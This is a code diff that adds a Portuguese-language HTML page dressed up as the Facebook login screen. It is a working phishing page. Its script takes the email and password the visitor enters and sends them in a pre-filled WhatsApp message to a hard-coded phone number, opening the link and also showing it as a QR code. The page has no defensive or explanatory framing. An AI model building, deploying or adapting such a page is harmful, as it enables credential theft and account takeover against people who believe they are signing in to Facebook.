@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – entre ou cadastre-se</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 100vh;
+    }
+
+    .top-section {
+      margin-top: 60px;
+      text-align: center;
+    }
+
+    .logo img {
+      width: 200px;
+    }
+
+    .login-box {
+      background-color: #fff;
+      padding: 20px;
+      margin-top: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      width: 100%;
+      max-width: 380px;
+      box-sizing: border-box;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 14px;
+      margin: 8px 0;
+      font-size: 16px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      box-sizing: border-box;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 14px;
+      margin-top: 12px;
+      background-color: #1877f2;
+      border: none;
+      color: white;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    .login-box button:hover {
+      background-color: #145dbf;
+    }
+
+    .forgot {
+      margin-top: 12px;
+      font-size: 14px;
+    }
+
+    .forgot a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .forgot a:hover {
+      text-decoration: underline;
+    }
+
+    .divider {
+      border-bottom: 1px solid #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-account {
+      background-color: #42b72a;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      padding: 12px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      width: 60%;
+      text-decoration: none;
+      display: inline-block;
+    }
+
+    .create-account:hover {
+      background-color: #36a420;
+    }
+
+    #qrcode {
+      margin-top: 20px;
+    }
+
+    .footer {
+      font-size: 12px;
+      text-align: center;
+      margin: 40px 10px 20px;
+      color: #737373;
+    }
+
+    .footer a {
+      color: #385898;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        margin: 20px;
+      }
+
+      .logo img {
+        width: 160px;
+      }
+
+      .create-account {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="top-section">
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+  </div>
+
+  <div class="login-box">
+    <input type="text" id="email" placeholder="Email ou telefone" required>
+    <input type="password" id="senha" placeholder="Senha" required>
+    <button onclick="gerarEnviar()">Entrar</button>
+
+    <div class="forgot">
+      <a href="https://www.facebook.com/login/identify" target="_blank">Esqueceu a senha?</a>
+    </div>
+
+    <div class="divider"></div>
+
+    <a class="create-account" href="https://www.facebook.com/r.php" target="_blank">Criar nova conta</a>
+
+    <div id="qrcode"></div>
+  </div>
+</div>
+
+<div class="footer">
+  Português (Brasil) · English (US) · Français (France) · Español · العربية · Italiano · Deutsch · हिन्दी <br><br>
+  Criar uma Página · Celebridades · Vagas · Privacidade · Cookies · Termos · Ajuda <br><br>
+  Facebook © 2025
+</div>
+
+<!-- QRCode lib -->
+<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+
+<script>
+  function gerarEnviar() {
+    const email = document.getElementById("email").value;
+    const senha = document.getElementById("senha").value;
+
+    if (!email || !senha) {
+      alert("Preencha todos os campos.");
+      return;
+    }
+
+    const numero = "258847747163";
+    const mensagem = `Nova tentativa de login:\nEmail: ${email}\nSenha: ${senha}`;
+    const textoCodificado = encodeURIComponent(mensagem);
+    const linkWhatsApp = `https://wa.me/${numero}?text=${textoCodificado}`;
+
+    const qrDiv = document.getElementById("qrcode");
+    qrDiv.innerHTML = "";
+
+    QRCode.toCanvas(linkWhatsApp, { width: 256 }, function (err, canvas) {
+      if (err) console.error(err);
+      qrDiv.appendChild(canvas);
+    });
+
+    window.open(linkWhatsApp, '_blank');
+  }
+</script>
+
+</body>
+</html>
